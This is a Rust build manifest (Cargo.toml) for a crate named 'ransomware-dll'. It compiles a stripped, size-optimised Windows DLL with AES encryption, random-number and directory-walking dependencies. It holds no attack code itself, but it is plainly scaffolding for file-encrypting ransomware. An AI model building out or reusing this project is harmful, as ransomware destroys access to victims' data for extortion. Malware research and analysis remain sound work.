[package]
name = "ransomware-dll"
version = "1.0.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]  # Compile as dynamic library (DLL)
name = "ransomware"

[dependencies]
# AES encryption
aes = "0.8"
rand = "0.8"

# File operations
walkdir = "2.4"

[target.'cfg(windows)'.dependencies]
winapi = { version = "0.3", features = [
    "winbase",
] }

[profile.release]
strip = true
lto = true
codegen-units = 1
panic = "abort"
opt-level = "z"
